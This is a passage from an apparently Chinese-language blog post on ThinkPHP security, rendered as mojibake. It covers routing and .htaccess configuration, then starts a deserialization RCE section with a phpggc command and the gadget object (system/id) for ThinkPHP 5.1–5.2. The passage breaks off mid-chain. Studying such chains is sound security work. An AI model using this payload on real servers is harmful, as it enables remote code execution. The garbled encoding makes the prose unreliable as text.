class="line">â”œâ”€â”€ common.php            â† å…¬å…±å‡½æ•°</span><br><span class="line">â”œâ”€â”€ config.php            â† å…¨å±€é…ç½®</span><br><span class="line">â””â”€â”€ route.php             â† è·¯ç”±å®šä¹‰</span><br></pre></td></tr></table></figure></div>

<h3 id="è·¯ç”±è®¿é—®å½¢å¼"><a href="#è·¯ç”±è®¿é—®å½¢å¼" class="headerlink" title="è·¯ç”±è®¿é—®å½¢å¼"></a>è·¯ç”±è®¿é—®å½¢å¼</h3><p>åœ¨ <strong>å¤šæ¨¡å— + MVC æ¨¡å¼</strong>ä¸‹ï¼ŒThinkPHP é»˜è®¤çš„ URL è·¯ç”±æ ¼å¼å¦‚ä¸‹ï¼Œè¿™ä¸ª URL è·¯ç”±æ ¼å¼å®é™…ä¸Šæ˜¯ ThinkPHP éµå¾ªçš„<strong>â€œçº¦å®šä¼˜äºé…ç½®â€</strong>è®¾è®¡æ€æƒ³çš„ä½“ç°ã€‚</p>
<div class="code-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://åŸŸå/æ¨¡å—/æ§åˆ¶å™¨/æ“ä½œ</span><br></pre></td></tr></table></figure></div>

<p>é»˜è®¤æƒ…å†µä¸‹ï¼Œæ¡†æ¶æ ¹æ® URL è§£æå‡ºæ¨¡å—åã€æ§åˆ¶å™¨åå’Œæ–¹æ³•åï¼Œè‡ªåŠ¨æ˜ å°„åˆ° <code>application/</code> ç›®å½•ä¸‹å¯¹åº”çš„ä½ç½®ï¼š</p>
<ul>
<li><code>/æ¨¡å—</code>ï¼šæ¡†æ¶ä¼šæ ¹æ® URL ä¸­çš„æ¨¡å—åå» <code>application/æ¨¡å—å/</code> ç›®å½•æŸ¥æ‰¾ã€‚</li>
<li><code>/æ§åˆ¶å™¨</code>ï¼šæ¡†æ¶ä¼šæ ¹æ®æ§åˆ¶å™¨åå» <code>controller/æ§åˆ¶å™¨å.php</code> æŸ¥æ‰¾ç±»æ–‡ä»¶ï¼Œç±»åé¦–å­—æ¯å¤§å†™ã€‚</li>
<li><code>/æ“ä½œï¼ˆæ–¹æ³•ï¼‰</code>ï¼šæ¡†æ¶ä¼šè°ƒç”¨æ§åˆ¶å™¨ï¼ˆå¯¹åº”ç±»æ–‡ä»¶ï¼‰ä¸­çš„æ–¹æ³•ï¼Œæ–¹æ³•åéœ€è¦ä¸ URL ä¸­çš„æ“ä½œåä¸€è‡´ã€‚</li>
</ul>
<p>ä¾‹å¦‚ï¼š</p>
<ul>
<li><code>http://localhost/index/index/index</code> â†’ <code>application/index/controller/Index.php::index()</code></li>
<li><code>http://localhost/admin/user/login</code> â†’ <code>application/admin/controller/User.php::login()</code></li>
<li><code>http://localhost/api/user/info</code> â†’ <code>application/api/controller/User.php::info()</code></li>
</ul>
<p>é»˜è®¤è·¯ç”±è§„åˆ™ç”±æ¡†æ¶è‡ªåŠ¨è§£æï¼Œä½†ä½ å¯ä»¥åœ¨ <code>route.php</code> ä¸­å®šä¹‰è‡ªå®šä¹‰è·¯ç”±è§„åˆ™ï¼Œå°† URL æ˜ å°„åˆ°ä¸åŒçš„æ§åˆ¶å™¨å’Œæ–¹æ³•ï¼Œå®ç°è·¯ç”±ç¾åŒ–ã€RESTful è·¯ç”±ç­‰ã€‚è¿™æ ·å¯ä»¥å¯¹é»˜è®¤çš„è·¯ç”±è¡Œä¸ºè¿›è¡Œç²¾ç»†æ§åˆ¶ã€‚</p>

  <div class="note-large red">
    <div class="notel-title rounded-t-lg p-3 font-bold text-lg flex flex-row gap-2 items-center">
      <p>æ³¨æ„</p>

    </div>
    <div class="notel-content markdown-body">
      <p>åœ¨ PhpStudy ä¸­å°†ç½‘ç«™çš„æ ¹ç›®å½•ä¿®æ”¹ä¸º ThinkPHP çš„ <code>public</code> ç›®å½•æ˜¯éƒ¨ç½²çš„æ ‡å‡†åšæ³•ï¼Œä½†å¦‚æœ<strong>æ²¡æœ‰æ‰‹åŠ¨é…ç½®ä¼ªé™æ€</strong>ï¼ŒPhpStudy é»˜è®¤ä¼š<strong>è¦†ç›– <code>public/.htaccess</code> æ–‡ä»¶ä¸ºç©ºæ–‡ä»¶</strong>ã€‚è¿™å°†å¯¼è‡´ Apache æ— æ³•è¿›è¡Œ URL é‡å†™ï¼Œè¿›è€Œä½¿ ThinkPHP çš„é»˜è®¤è·¯ç”±å¤±æ•ˆï¼ˆå¦‚ <code>/index/index/index</code> ä¼šç›´æ¥è¿”å› 404ï¼‰ã€‚</p>
<p>å³ä½¿ä½ æ¢å¤äº† ThinkPHP é»˜è®¤çš„ <code>.htaccess</code> æ–‡ä»¶ï¼Œå…¶å†…å®¹å¦‚ä¸‹ï¼š</p>
<div class="code-container" data-rel="Xml"><figure class="iseeu highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">IfModule</span> <span class="attr">mod_rewrite.c</span>&gt;</span></span><br><span class="line">  Options +FollowSymlinks -Multiviews</span><br><span class="line">  RewriteEngine On</span><br><span class="line"></span><br><span class="line">  RewriteCond %&#123;REQUEST_FILENAME&#125; !-d</span><br><span class="line">  RewriteCond %&#123;REQUEST_FILENAME&#125; !-f</span><br><span class="line">  RewriteRule ^(.*)$ index.php/$1 [QSA,PT,L]</span><br><span class="line"><span class="tag">&lt;/<span class="name">IfModule</span>&gt;</span></span><br></pre></td></tr></table></figure></div>

<p>è¿™ä¸ªé…ç½®é‡‡ç”¨çš„æ˜¯ <strong>PATH_INFO æ¨¡å¼</strong>ï¼Œå³å¸Œæœ› Apache å°† <code>index.php/æ¨¡å—/æ§åˆ¶å™¨/æ“ä½œ</code> ä¸­ <code>/æ¨¡å—/æ§åˆ¶å™¨/æ“ä½œ</code> è‡ªåŠ¨ä½œä¸º PATH_INFO ä¼ é€’ç»™ PHPã€‚ä½†è¿™ä¾èµ–äºæœåŠ¡å™¨ç¯å¢ƒï¼ˆApache + PHP-FPM æˆ– CGIï¼‰æ˜¯å¦å¯ç”¨äº†å¯¹ PATH_INFO çš„æ”¯æŒã€‚</p>
<p>åœ¨ PhpStudy çš„é»˜è®¤ç¯å¢ƒä¸­ï¼Œ<strong>å¾€å¾€å¹¶æœªå¯ç”¨ <code>AcceptPathInfo</code> æˆ– PHP çš„ <code>cgi.fix_pathinfo</code> é…ç½®ä¸å…¼å®¹</strong>ï¼Œå› æ­¤è¯¥å†™æ³•è™½ç„¶æ˜¯ ThinkPHP é»˜è®¤æä¾›çš„ï¼Œå´ä¼šå¯¼è‡´ URL æ— æ³•æ­£ç¡®è§£æï¼ˆæ¡†æ¶æ— æ³•è·å–åˆ° PATH_INFOï¼‰ã€‚</p>
<p>ä¸ºäº†è§£å†³è¿™ä¸ªé—®é¢˜ï¼Œæˆ‘ä»¬å»ºè®®æ”¹ç”¨ <strong>å…¼å®¹æ¨¡å¼</strong> çš„ <code>.htaccess</code> é‡å†™è§„åˆ™ï¼š</p>
<div class="code-container" data-rel="Xml"><figure class="iseeu highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">IfModule</span> <span class="attr">mod_rewrite.c</span>&gt;</span></span><br><span class="line">    RewriteEngine On</span><br><span class="line">    RewriteCond %&#123;REQUEST_FILENAME&#125; !-d</span><br><span class="line">    RewriteCond %&#123;REQUEST_FILENAME&#125; !-f</span><br><span class="line">    RewriteRule ^(.*)$ index.php?s=$1 [QSA,PT,L]</span><br><span class="line"><span class="tag">&lt;/<span class="name">IfModule</span>&gt;</span></span><br></pre></td></tr></table></figure></div>

<p>è¯¥è§„åˆ™é€šè¿‡ GET å‚æ•° <code>s</code> ä¼ é€’ URL ä¿¡æ¯ï¼Œä¾‹å¦‚è®¿é—® <code>/index/index/index</code> ä¼šè¢«é‡å†™ä¸ºï¼š</p>
<div class="code-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">index.php?s=index/index/index</span><br></pre></td></tr></table></figure></div>

<p>ThinkPHP å†…éƒ¨ä¼šè‡ªåŠ¨è¯»å– <code>$_GET[&#39;s&#39;]</code> å¹¶å°†å…¶ä½œä¸º pathinfo è¿›è¡Œè§£æã€‚è¿™ç§æ–¹å¼å±äº ThinkPHP æ”¯æŒçš„ <strong>URL å…¼å®¹æ¨¡å¼</strong>ï¼Œä» TP3 åˆ° TP5.2 éƒ½æœ‰å†…ç½®å…¼å®¹é€»è¾‘ï¼Œå¯¹æœåŠ¡å™¨ç¯å¢ƒå‡ ä¹æ²¡æœ‰è¦æ±‚ï¼Œ<strong>æ˜¯æœ€é€šç”¨ã€æœ€ç¨³å®šçš„è§£å†³æ–¹æ¡ˆ</strong>ã€‚</p>

    </div>
  </div>

<p><code>route.php</code> æ˜¯ ThinkPHP ä¸­å®šä¹‰è·¯ç”±è§„åˆ™çš„æ–‡ä»¶ï¼Œä½äº <code>application/</code> ç›®å½•ä¸‹ï¼Œä¸»è¦ç”¨äºè¿›è¡Œ URL çš„æ˜ å°„ã€é‡å†™å’Œè‡ªå®šä¹‰ã€‚é»˜è®¤æƒ…å†µä¸‹ï¼ŒThinkPHP è‡ªåŠ¨åŠ è½½è¯¥æ–‡ä»¶ï¼Œå¹¶æ ¹æ®æ–‡ä»¶ä¸­çš„é…ç½®æ¥è§£æè·¯ç”±è§„åˆ™ã€‚</p>
<p><code>route.php</code> ä¸­çš„è§„åˆ™ç”¨äºå°† <strong>URL</strong> æ˜ å°„åˆ°å…·ä½“çš„ <strong>æ§åˆ¶å™¨æ–¹æ³•</strong>ã€‚ä¾‹å¦‚ï¼Œä½ å¯ä»¥å°† <code>http://localhost/login</code> æ˜ å°„åˆ° <code>application/admin/controller/User.php</code> ä¸­çš„ <code>login()</code> æ–¹æ³•ã€‚</p>
<div class="code-container" data-rel="Php"><figure class="iseeu highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">use</span> <span class="title">think</span>\<span class="title">Route</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">// æ˜ å°„ /login åˆ° Admin æ§åˆ¶å™¨çš„ login æ–¹æ³•</span></span><br><span class="line"><span class="title class_">Route</span>::<span class="title function_ invoke__">get</span>(<span class="string">&#x27;login&#x27;</span>, <span class="string">&#x27;admin/user/login&#x27;</span>);</span><br></pre></td></tr></table></figure></div>

<p>å¦å¤– <code>route.php</code> è¿˜æ”¯æŒå…¶ä»–å¤šç§è·¯ç”±é…ç½®æ¨¡å¼ï¼š</p>
<div class="code-container" data-rel="Php"><figure class="iseeu highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">use</span> <span class="title">think</span>\<span class="title">Route</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">// ç®€å•çš„è·¯ç”±æ˜ å°„</span></span><br><span class="line"><span class="comment">// æ˜ å°„ /login åˆ° admin/user/login æ–¹æ³•</span></span><br><span class="line"><span class="comment">// è®¿é—® http://localhost/login å°†ä¼šè°ƒç”¨ application/admin/controller/User.php çš„ login() æ–¹æ³•ã€‚</span></span><br><span class="line"><span class="comment">// è¿™é‡Œä½¿ç”¨äº† GET è¯·æ±‚æ–¹å¼ï¼Œå¦‚æœéœ€è¦å…¶ä»–è¯·æ±‚ç±»å‹ï¼Œå¯ä»¥ä½¿ç”¨ `Route::post()` æˆ– `Route::put()` ç­‰æ–¹æ³•ã€‚</span></span><br><span class="line"><span class="title class_">Route</span>::<span class="title function_ invoke__">get</span>(<span class="string">&#x27;login&#x27;</span>, <span class="string">&#x27;admin/user/login&#x27;</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">// åŠ¨æ€è·¯ç”±ï¼ˆå¸¦å‚æ•°ï¼‰</span></span><br><span class="line"><span class="comment">// è®¿é—® http://localhost/user/42 ä¼šå°† 42 ä½œä¸ºå‚æ•°ä¼ é€’ç»™ show() æ–¹æ³•ã€‚</span></span><br><span class="line"><span class="comment">// æ˜ å°„çš„è§„åˆ™æ˜¯ /user/:id åˆ° api/user/show æ–¹æ³•ï¼Œid å°†ä¼ é€’åˆ° show($id) æ–¹æ³•ä¸­ã€‚</span></span><br><span class="line"><span class="title class_">Route</span>::<span class="title function_ invoke__">get</span>(<span class="string">&#x27;user/:id&#x27;</span>, <span class="string">&#x27;api/user/show&#x27;</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">// RESTful è·¯ç”±ï¼ˆé€‚ç”¨äº CRUDï¼‰</span></span><br><span class="line"><span class="comment">// è‡ªåŠ¨ç”Ÿæˆå¸¸è§çš„ CRUD è·¯ç”±ï¼š</span></span><br><span class="line"><span class="comment">// GET /user        â†’ æ˜¾ç¤ºç”¨æˆ·åˆ—è¡¨ï¼ˆindex()ï¼‰</span></span><br><span class="line"><span class="comment">// POST /user       â†’ åˆ›å»ºæ–°ç”¨æˆ·ï¼ˆcreate()ï¼‰</span></span><br><span class="line"><span class="comment">// GET /user/:id    â†’ è·å–æŒ‡å®šç”¨æˆ·ï¼ˆread($id)ï¼‰</span></span><br><span class="line"><span class="comment">// PUT /user/:id    â†’ æ›´æ–°æŒ‡å®šç”¨æˆ·ï¼ˆupdate($id)ï¼‰</span></span><br><span class="line"><span class="comment">// DELETE /user/:id â†’ åˆ é™¤æŒ‡å®šç”¨æˆ·ï¼ˆdelete($id)ï¼‰</span></span><br><span class="line"><span class="title class_">Route</span>::<span class="title function_ invoke__">resource</span>(<span class="string">&#x27;user&#x27;</span>, <span class="string">&#x27;api/user&#x27;</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">// è·¯ç”±åˆ†ç»„</span></span><br><span class="line"><span class="comment">// è·¯ç”±åˆ†ç»„å…è®¸ä½ ä¸ºä¸€ç»„è·¯ç”±å®šä¹‰ç»Ÿä¸€çš„å‰ç¼€æˆ–ä¸­é—´ä»¶ã€‚</span></span><br><span class="line"><span class="comment">// ä¾‹å¦‚ï¼Œæ‰€æœ‰çš„è·¯ç”±éƒ½ä»¥ /admin å¼€å¤´ã€‚è®¿é—® /admin/dashboard ä¼šæ˜ å°„åˆ° application/admin/controller/Dashboard.php çš„ index() æ–¹æ³•ã€‚</span></span><br><span class="line"><span class="comment">// è®¿é—® /admin/login ä¼šæ˜ å°„åˆ° application/admin/controller/User.php çš„ login() æ–¹æ³•ã€‚</span></span><br><span class="line"><span class="title class_">Route</span>::<span class="title function_ invoke__">group</span>(<span class="string">&#x27;admin&#x27;</span>, function () &#123;</span><br><span class="line">    <span class="title class_">Route</span>::<span class="title function_ invoke__">get</span>(<span class="string">&#x27;dashboard&#x27;</span>, <span class="string">&#x27;admin/dashboard/index&#x27;</span>); <span class="comment">// åå°é¦–é¡µ</span></span><br><span class="line">    <span class="title class_">Route</span>::<span class="title function_ invoke__">get</span>(<span class="string">&#x27;login&#x27;</span>, <span class="string">&#x27;admin/user/login&#x27;</span>);         <span class="comment">// åå°ç™»å½•</span></span><br><span class="line">&#125;);</span><br><span class="line"></span><br><span class="line"><span class="comment">// è·¯ç”±å‚æ•°åŒ¹é…è§„åˆ™</span></span><br><span class="line"><span class="comment">// è¿™æ¡è·¯ç”±è§„åˆ™å°†é™åˆ¶ id å‚æ•°ä¸ºæ•°å­—ã€‚è®¿é—® /user/42 å°†ä¼šè°ƒç”¨ api/user/show æ–¹æ³•å¹¶ä¼ é€’ 42 ä½œä¸ºå‚æ•°ã€‚</span></span><br><span class="line"><span class="comment">// è®¿é—® /user/abc å°†ä¼šåŒ¹é…å¤±è´¥ï¼Œå› ä¸º abc ä¸æ˜¯æ•°å­—ã€‚</span></span><br><span class="line"><span class="title class_">Route</span>::<span class="title function_ invoke__">get</span>(<span class="string">&#x27;user/:id&#x27;</span>, <span class="string">&#x27;api/user/show&#x27;</span>)-&gt;<span class="title function_ invoke__">pattern</span>([<span class="string">&#x27;id&#x27;</span> =&gt; <span class="string">&#x27;\d+&#x27;</span>]);</span><br></pre></td></tr></table></figure></div>


  <div class="note-large blue">
    <div class="notel-title rounded-t-lg p-3 font-bold text-lg flex flex-row gap-2 items-center">
      <p>æç¤º</p>

    </div>
    <div class="notel-content markdown-body">
      <p>ThinkPHP çš„ä¸­è·¯å¾„å‚æ•°æ˜¯ URL è·¯å¾„ä¸­çš„ä¸€éƒ¨åˆ†ï¼Œé€šè¿‡è·¯ç”±è§„åˆ™ä¸­çš„ <code>:å˜é‡å</code> æ¥å®šä¹‰ã€‚ä¾‹å¦‚ä¸‹é¢è¿™ä¸ªä¾‹å­ï¼š</p>
<div class="code-container" data-rel="Php"><figure class="iseeu highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="title class_">Route</span>::<span class="title function_ invoke__">get</span>(<span class="string">&#x27;user/:id/:name&#x27;</span>, <span class="string">&#x27;index/user/profile&#x27;</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">profile</span>(<span class="params"><span class="variable">$id</span>, <span class="variable">$name</span></span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;<span class="subst">$id</span>, <span class="subst">$name</span>&quot;</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<p>è·¯ç”±å®šä¹‰ä¸­çš„ <code>:id</code>ã€<code>:name</code> ä¼š <strong>è‡ªåŠ¨åŒ¹é…å¹¶æ³¨å…¥åˆ°å‡½æ•°å‚æ•°ä¸­</strong>ï¼ˆ<strong>è·¯å¾„å‚æ•°ç‹¬æœ‰çš„ç‰¹æ€§</strong>ï¼‰ï¼Œå› æ­¤æˆ‘ä»¬ä¸éœ€è¦é€šè¿‡ <code>input</code> æ¥è·å–å‚æ•°ã€‚</p>
<p>å¦å¤–è·¯å¾„å‚æ•°<strong>é»˜è®¤æ˜¯å­—ç¬¦ä¸²ç±»å‹</strong>ï¼Œä¸ä¼šè‡ªåŠ¨è¿›è¡Œå¼ºåˆ¶ç±»å‹è½¬æ¢ã€‚å¦‚æœéœ€è¦<strong>é™åˆ¶ä¼ é€’çš„å‚æ•°ç±»å‹</strong>åˆ™éœ€è¦ä½¿ç”¨ <code>pattern()</code> é™åˆ¶ã€‚</p>
<div class="code-container" data-rel="Php"><figure class="iseeu highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="title class_">Route</span>::<span class="title function_ invoke__">get</span>(<span class="string">&#x27;user/:id&#x27;</span>, <span class="string">&#x27;index/user/show&#x27;</span>)-&gt;<span class="title function_ invoke__">pattern</span>([<span class="string">&#x27;id&#x27;</span> =&gt; <span class="string">&#x27;\d+&#x27;</span>]);</span><br></pre></td></tr></table></figure></div>

<p><strong>ä½†è¿™åªæ˜¯â€œé™åˆ¶æ ¼å¼â€ï¼Œä¸ç­‰äºç±»å‹è½¬æ¢</strong>ï¼Œæ§åˆ¶å™¨ä¸­ä»éœ€ <code>(int)$id</code> æˆ–ç”¨ <code>/d</code> è¿‡æ»¤ã€‚</p>

    </div>
  </div>

<h2 id="æ¡†æ¶åˆ†æ"><a href="#æ¡†æ¶åˆ†æ" class="headerlink" title="æ¡†æ¶åˆ†æ"></a>æ¡†æ¶åˆ†æ</h2><h3 id="æ¡†æ¶ç»“æ„"><a href="#æ¡†æ¶ç»“æ„" class="headerlink" title="æ¡†æ¶ç»“æ„"></a>æ¡†æ¶ç»“æ„</h3><p>æºç çš„ç›®å½•ç»“æ„å¤§è‡´å¦‚ä¸‹ï¼š</p>
<div class="code-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line">thinkphp/</span><br><span class="line">â”œâ”€â”€ base.php                â˜… æç®€å¯åŠ¨å™¨ï¼šå¸¸é‡ã€è‡ªåŠ¨åŠ è½½ã€åŠ©æ‰‹å‡½æ•°</span><br><span class="line">â”œâ”€â”€ start.php               â˜… æ­£å¼å¯åŠ¨å™¨ï¼šå®ä¾‹åŒ– App å¹¶æ‰§è¡Œ run()</span><br><span class="line">â”œâ”€â”€ helper.php              é€šç”¨åŠ©æ‰‹å‡½æ•°ï¼ˆurl(), dump() ç­‰ï¼‰</span><br><span class="line">â”œâ”€â”€ convention.php          æ¡†æ¶é»˜è®¤é…ç½®</span><br><span class="line">â”œâ”€â”€ lang/zh-cn.php          æ¡†æ¶å†…ç½®ä¸­æ–‡è¯­è¨€åŒ…</span><br><span class="line">â””â”€â”€ library/</span><br><span class="line">    â””â”€â”€ think/              â˜… æ‰€æœ‰æ ¸å¿ƒç±»éƒ½åœ¨è¿™é‡Œ</span><br><span class="line">        â”œâ”€â”€ App.php</span><br><span class="line">        â”œâ”€â”€ Request.php</span><br><span class="line">        â”œâ”€â”€ Response.php</span><br><span class="line">        â”œâ”€â”€ Route.php</span><br><span class="line">        â”œâ”€â”€ Controller.php</span><br><span class="line">        â”œâ”€â”€ Model.php</span><br><span class="line">        â”œâ”€â”€ Db.php</span><br><span class="line">        â”œâ”€â”€ Validate.php</span><br><span class="line">        â”œâ”€â”€ ...</span><br><span class="line">        â”œâ”€â”€ cache/          ç¼“å­˜å­ç³»ç»Ÿ</span><br><span class="line">        â”œâ”€â”€ config/         é…ç½®æ–‡ä»¶è§£æ</span><br><span class="line">        â”œâ”€â”€ console/        CLI å‘½ä»¤æ¡†æ¶</span><br><span class="line">        â”œâ”€â”€ db/             ORM / æŸ¥è¯¢æ„å»ºå™¨</span><br><span class="line">        â”œâ”€â”€ debug/          è°ƒè¯•/Trace é¢æ¿</span><br><span class="line">        â”œâ”€â”€ exception/      æ¡†æ¶çº§å¼‚å¸¸ç±»å‹</span><br><span class="line">        â”œâ”€â”€ facade/         é—¨é¢ç±»ï¼ˆé™æ€ä»£ç†ï¼‰</span><br><span class="line">        â”œâ”€â”€ model/          ORM å…³è”ã€Pivotã€Trait ç­‰</span><br><span class="line">        â”œâ”€â”€ process/        è¿›ç¨‹&amp;å­è¿›ç¨‹å°è£…ï¼ˆpipes/Windows.php*ï¼‰</span><br><span class="line">        â”œâ”€â”€ route/          è·¯ç”±è°ƒåº¦å®ç°</span><br><span class="line">        â”œâ”€â”€ session/        Session é©±åŠ¨</span><br><span class="line">        â”œâ”€â”€ template/       æ¨¡æ¿å¼•æ“</span><br><span class="line">        â”œâ”€â”€ validate/       éªŒè¯è§„åˆ™</span><br><span class="line">        â””â”€â”€ view/           è§†å›¾åº“</span><br></pre></td></tr></table></figure></div>

<h3 id="æ¡†æ¶å¯åŠ¨"><a href="#æ¡†æ¶å¯åŠ¨" class="headerlink" title="æ¡†æ¶å¯åŠ¨"></a>æ¡†æ¶å¯åŠ¨</h3><h3 id="è·¯ç”±åˆ†å‘"><a href="#è·¯ç”±åˆ†å‘" class="headerlink" title="è·¯ç”±åˆ†å‘"></a>è·¯ç”±åˆ†å‘</h3><h1 id="è¿œç¨‹ä»£ç æ‰§è¡Œ"><a href="#è¿œç¨‹ä»£ç æ‰§è¡Œ" class="headerlink" title="è¿œç¨‹ä»£ç æ‰§è¡Œ"></a>è¿œç¨‹ä»£ç æ‰§è¡Œ</h1><h1 id="SQL-æ³¨å…¥"><a href="#SQL-æ³¨å…¥" class="headerlink" title="SQL æ³¨å…¥"></a>SQL æ³¨å…¥</h1><h1 id="ååºåˆ—åŒ–"><a href="#ååºåˆ—åŒ–" class="headerlink" title="ååºåˆ—åŒ–"></a>ååºåˆ—åŒ–</h1><h2 id="RCE1ï¼ˆå½±å“-5-1-x-5-2-xï¼‰"><a href="#RCE1ï¼ˆå½±å“-5-1-x-5-2-xï¼‰" class="headerlink" title="RCE1ï¼ˆå½±å“ 5.1.x - 5.2.xï¼‰"></a>RCE1ï¼ˆå½±å“ 5.1.x - 5.2.xï¼‰</h2><h3 id="åŸºæœ¬ä¿¡æ¯"><a href="#åŸºæœ¬ä¿¡æ¯" class="headerlink" title="åŸºæœ¬ä¿¡æ¯"></a>åŸºæœ¬ä¿¡æ¯</h3><ul>
<li><p><strong>å½±å“èŒƒå›´</strong> ï¼š5.1.x - 5.2.x</p>
</li>
<li><p><strong>ç”Ÿæˆå‘½ä»¤</strong> ï¼š</p>
<div class="code-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">phpggc ThinkPHP/RCE1 system <span class="built_in">id</span>  -b</span><br></pre></td></tr></table></figure></div>
</li>
<li><p><strong>ååºåˆ—åŒ–å¯¹è±¡</strong> ï¼š</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/2025/07/28/ThinkPHP%20%E6%A1%86%E6%9E%B6%E5%AE%89%E5%85%A8/images/TPRCE1.svg"
                      alt="TPRCE1"
                ></p>
<div class="code-container" data-rel="Php"><figure class="iseeu highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">think\process\pipes\Windows <span class="title function_ invoke__">Object</span></span><br><span class="line">(</span><br><span class="line">    [<span class="attr">files</span>:think\process\pipes\<span class="attr">Windows</span>:<span class="keyword">private</span>] =&gt; <span class="title function_ invoke__">Array</span></span><br><span class="line">        (</span><br><span class="line">            [<span class="number">0</span>] =&gt; think\model\Pivot <span class="title function_ invoke__">Object</span></span><br><span class="line">                (</span><br><span class="line">                    [<span class="attr">data</span>:think\<span class="attr">Model</span>:<span class="keyword">private</span>] =&gt; <span class="title function_ invoke__">Array</span></span><br><span class="line">                        (</span><br><span class="line">                            [smi1e] =&gt; id</span><br><span class="line">                        )</span><br><span class="line"></span><br><span class="line">                    [<span class="attr">withAttr</span>:think\<span class="attr">Model</span>:<span class="keyword">private</span>] =&gt; <span class="title function_ invoke__">Array</span></span><br><span class="line">                        (</span><br><span class="line">                            [smi1e] =&gt; system</span><br><span class="line">                        )</span><br><span class="line"></span><br><span class="line">                )</span><br><span class="line"></span><br><span class="line">        )</span><br><span class="line"></span><br><span class="line">)</span><br></pre></td></tr></table></figure></div>
</li>
<li><p><strong>ååºåˆ—åŒ–è°ƒç”¨é“¾</strong> ï¼š</p>
<div class="code-container" data-rel="Php"><figure class="iseeu highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">think\process\pipes\Windows-&gt;<span class="title function_ invoke__">__destruct</span>()</span><br><span class="line">    â””â”€â”€ <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">removeFiles</span>()</span><br><span class="line">         â””â”€â”€ <span class="keyword">foreach</span> (<span class="variable language_">$this</span>-&gt;files <span class="keyword">as</span> <span class="variable">$filename</span>)</span><br><span class="line">              â””â”€â”€ <span class="title function_ invoke__">file_exists</span>(<span class="variable">$filename</span>)      <span class="comment">// âœ… éœ€è¦æ„é€ ï¼š$this-&gt;files = 